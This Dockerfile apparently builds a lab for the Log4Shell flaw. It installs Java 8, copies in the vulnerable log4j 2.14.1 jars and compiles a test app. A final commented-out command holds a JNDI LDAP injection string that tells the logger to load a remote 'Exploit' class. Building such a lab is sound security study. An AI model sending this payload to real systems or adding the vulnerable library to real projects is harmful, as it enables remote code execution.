# Use an official openjdk image
FROM ubuntu:latest

# Install necessary packages
RUN apt update && apt-get install -y openjdk-8-jdk-headless

# Set working directory
WORKDIR /app

# Copy application files
COPY App.java /app
COPY log4j2.xml /app
COPY ./lib/apache-log4j-2.14.1/log4j-core-2.14.1.jar /app
COPY ./lib/apache-log4j-2.14.1/log4j-api-2.14.1.jar /app

# Compile the Java application
RUN javac -cp .:log4j-core-2.14.1.jar:log4j-api-2.14.1.jar App.java

USER root
# start up a shell
CMD ["/bin/bash"]

# # Command to run the application
# java -cp .:log4j-core-2.14.1.jar:log4j-api-2.14.1.jar App

# CMD ["java", "-cp", ".:log4j-core-2.14.1.jar:log4j-api-2.14.1.jar", "App", "${jndi:ldap://localhost:1389/#Exploit}"]
